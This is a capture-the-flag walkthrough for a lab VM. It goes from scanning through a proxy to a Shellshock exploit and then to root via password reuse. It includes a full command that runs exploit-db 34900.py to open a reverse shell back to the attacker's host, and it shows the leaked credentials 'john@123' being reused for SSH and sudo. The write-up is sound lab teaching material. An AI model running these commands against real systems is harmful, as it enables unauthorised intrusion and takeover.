                <p>In this CTF we are going to learn about command injection, using searchsploit, and privilege
                    escalation.</p>
                <p>The first thing we'll do is run a quick nmap scan, as I am still having trouble with netdiscover on
                    NAT network. As we can see from the scan below, our host, <code class="language-sh">10.0.2.6</code>
                    has ports 22, 3128, and 8080 exposed.</p>
                <img src="img/sick1/sick1-1.png" class="sc">
                <p>Good. We have identified the host, now for a more intense nmap scan. On port 3128 there looks to be
                    an open HTTP proxy.</p>
                <img src="img/sick1/sick1-2.png" class="sc">
                <p>Let's configure our proxy settings in firefox...</p>
                <img src="img/sick1/sick1-3.png" class="sc">
                <p>...and navigate to the IP. BLEHHH!!!</p>
                <img src="img/sick1/sick1-4.png" class="sc">
                <p>Searching the source code revealed nothing, so we can look at the robots.txt for clues. It looks like
                    there is a directory that the website owner wants discluded from search engine results, <code
                        class="language-sh">/wolfcms</code>.</p>
                <img src="img/sick1/sick1-5.png" class="sc">
                <p>At this point I decided to try a dirb scan of the root directory, but that revealed nothing new.</p>
                <img src="img/sick1/sick1-6.png" class="sc">
                <p>Instead, let's try a dirb scan of the <code class="language-sh">/wolfcms</code> directory. This
                    really doesn't net us anything of value, other than a confirmed 200 code on <code
                        class="language-sh">/wolfcms/index.*</code>, so we can navigate there via the browser.</p>
                <img src="img/sick1/sick1-7.png" class="sc">
                <p>Here we see a web app called Wolf: Content Management Simplified. There is nothing significant here,
                    and we really don't have a direction to move in, so let's run a nikto vulnerability scan.</p>
                <img src="img/sick1/sick1-8.png" class="sc">
                <p>The composition of the scan is as follows:</p>
                <p><code class="language-sh">nikto -host 10.0.2.6 -useproxy 10.0.2.6:3128</code></p>
                <p>And the results include the Shell Shock vulnerability listed below.</p>
                <img src="img/sick1/sick1-9.png" class="sc">
                <p>Using searchsploit, we are able to find a list of exploits that will allow us to create a reverse
                    shell on the vulnerable host. In this case we are going to be using 34900.py.
                    So, we can just copy the exploit into our working directory so we can edit it if necessary.
                </p>
                <p><code class="language-sh">cp /usr/share/exploitdb/exploits/linux/remote/34900.py 34900.py</code></p>
                <img src="img/sick1/sick1-10.png" class="sc">
                <p>By simply running the program, <code class="language-sh">python 34900.py</code> we can see exactly
                    how to build our command.</br> </p>
                <p><code
                        class="language-sh">python 34900.py payload=reverse rhost=10.0.2.6/cgi-bin/status lhost=10.0.2.15 lport=1234 proxy=10.0.2.6:3128</code>
                </p>
                <p>Above is the command the complete command that we can use to establish a reverse shell.</p>
                <img src="img/sick1/sick1-11.png" class="sc">
                <p>And we're in!</p>
                <img src="img/sick1/sick1-12.png" class="sc">
                <p>Now, because of the increasing instability of my shell, I am going to take this as an opportunity to
                    see if these credentials can be used elsewhere and log into the machine directly.
                </p>
                <p>The username and password combination, sickos john@123, works, and we are now logged in.</p>
                <img src="img/sick1/sick1-13.png" class="sc">
                <p>Then, we can attempt to reuse the password for sudo, and that works to! Finishing the CTF is as
                    simple as <code class="language-sh">sudo su</code>, using john@123 as the password again, and
                    navigating to the root directory. And there is the victory
                    flag.
                </p>
                <img src="img/sick1/sick1-14.png" class="sc">
                <p>There were many other ways that we could have gotten to root. During the initial exploitation phase,
                    we could have used default admin credentials
                    to log into the admin system and upload a reverse shell and gain access that way. Had I been able to
                    secure a more stable shell in the first place,
                    we could have used the <code class="language-sh">connect.py</code> file in the <code
                        class="language-sh">/var/www/</code> directory. There we could have
                    updated the file's contetnts to create a script that opens a reverse shell as root. For simple CTFs
                    like this one, manual credential experimentation
                    is a fine strategy, but nowadays you can expect people to use more secure credential practices.
                    Anyway, that was a fun CTF and I hope you learned something.
